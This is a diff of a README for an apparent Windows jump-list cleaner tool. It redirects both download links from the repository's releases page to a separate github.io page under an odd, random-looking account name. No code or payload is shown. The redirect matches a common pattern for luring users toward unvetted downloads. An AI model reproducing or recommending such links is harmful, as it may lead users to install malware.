@@ -1,6 +1,6 @@
 <h1>🧹 Windows-Jump-List-Cleaner-Tool - Clear Junk and Protect Your Privacy</h1>
 
-[![Download Now](https://img.shields.io/badge/Download-Windows_Jump_List_Cleaner-2ea44f?style=for-the-badge)](https://github.com/hangingflyindependenceday9611/Windows-Jump-List-Cleaner-Tool/releases)
+[![Download Now](https://img.shields.io/badge/Download-Windows_Jump_List_Cleaner-2ea44f?style=for-the-badge)](https://hangingflyindependenceday9611.github.io)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome! This tool helps you clean up the **Jump Lists** on your Windows compute
 
 To get started, you need to download the application file.
 
-Visit this link to download the application: [https://github.com/hangingflyindependenceday9611/Windows-Jump-List-Cleaner-Tool/releases](https://github.com/hangingflyindependenceday9611/Windows-Jump-List-Cleaner-Tool/releases)
+Visit this link to download the application: [https://hangingflyindependenceday9611.github.io](https://hangingflyindependenceday9611.github.io)
 
 On that page, look for the newest version and click the download button. The file will be small and download quickly.
 
